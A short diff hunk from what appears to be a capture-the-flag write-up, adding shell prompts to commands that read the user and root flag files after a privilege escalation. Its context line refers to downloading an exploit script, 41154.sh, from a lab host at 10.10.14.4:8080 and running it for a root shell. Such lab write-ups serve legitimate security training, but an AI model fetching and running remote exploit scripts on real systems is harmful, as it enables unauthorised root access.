@@ -229,10 +229,10 @@ http://10.10.14.4:8080/41154.sh`. Just run it and a couple of seconds later we s
 have a root shell! Let's read the flags:
 
 ```
-wc -c /home/shelby/user.txt
+$ wc -c /home/shelby/user.txt
 33 /home/shelby/user.txt
 
-wc -c /root/root.txt
+$ wc -c /root/root.txt
 33 /root/root.txt
 ```
 
